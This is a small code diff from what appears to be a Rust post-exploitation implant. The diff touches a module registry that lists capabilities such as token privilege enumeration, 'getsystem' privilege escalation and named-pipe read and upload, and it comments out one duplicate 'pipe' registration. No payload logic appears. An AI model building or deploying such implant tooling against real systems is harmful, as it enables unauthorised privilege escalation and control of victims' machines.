@@ -207,7 +207,7 @@ pub extern "C" fn register_modules() -> HashMap<String, Box<MaleficModule>> {
         register_module!(map, "privs", sys::token::GetPriv);
         register_module!(map, "getsystem", sys::token::GetSystem);
 
-        register_module!(map, "pipe", fs::pipe::PipeClose);
+        // register_module!(map, "pipe", fs::pipe::PipeClose);
         register_module!(map, "pipe", fs::pipe::PipeRead);
         register_module!(map, "pipe", fs::pipe::PipeUpload);
         
